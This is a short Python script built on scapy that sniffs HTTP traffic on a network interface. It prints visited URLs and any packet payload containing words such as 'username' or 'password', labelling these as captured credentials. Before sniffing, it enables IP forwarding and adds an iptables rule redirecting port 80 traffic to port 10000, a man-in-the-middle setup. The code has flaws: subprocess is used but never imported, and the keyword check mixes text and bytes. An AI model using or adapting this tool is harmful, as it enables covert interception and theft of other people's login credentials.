#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import optparse
import time


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "uname"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username / Password >> " + login_info + "\n\n")


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Please specify an Interface to sniff")
    options = parser.parse_args()[0]
    if not options.interface:
        parser.error("Please enter an Interface to sniff, use --help for more info.")
    else:
        return options


try:
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000", shell=True)
    options = get_arguments()

    sniff(options.interface)
except KeyboardInterrupt:
    print("[-] Closing Packet Sniffer...")

